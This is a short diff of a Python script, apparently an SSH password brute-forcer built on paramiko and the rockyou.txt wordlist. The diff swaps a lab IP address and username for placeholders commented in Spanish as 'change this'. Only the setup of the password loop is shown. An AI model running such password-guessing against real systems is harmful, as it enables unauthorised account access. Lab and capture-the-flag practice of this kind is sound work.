@@ -4,8 +4,8 @@ import paramiko
 
 def exploit():
 	intentos = 0
-	target = "192.168.186.128"
-	user = "rabb1t"
+	target = "10.10.10.10" # cambia esto
+	user = "user" # cambia esto
 
 	with open ("rockyou.txt", "r") as password_list:
 		for password in password_list:
